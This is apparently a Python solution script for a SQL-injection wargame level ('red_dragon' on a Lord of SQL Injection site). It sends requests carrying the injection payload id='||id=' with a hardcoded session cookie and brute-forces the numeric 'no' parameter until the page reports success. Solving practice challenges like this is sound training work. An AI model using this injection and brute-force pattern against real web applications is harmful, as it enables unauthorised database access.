import requests

cookies={'PHPSESSID':'8pt5qvotaijsant070i27b03jq'}
value=0
hex_value="0123456789abcdefghijklmnopqrstuvwxyz"
while True:
    address="https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php"
    url=address+"?id='||id='&no="+str(value)
    res=requests.get(url,cookies=cookies)
    if  "Clear" in res.text:
        print("no= "+str(value))
        break
    value+=1


